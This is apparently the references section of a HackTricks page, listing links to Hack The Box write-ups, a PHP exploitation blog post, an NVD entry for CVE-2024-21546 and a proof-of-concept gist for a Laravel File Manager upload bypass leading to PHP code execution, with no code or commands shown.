- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
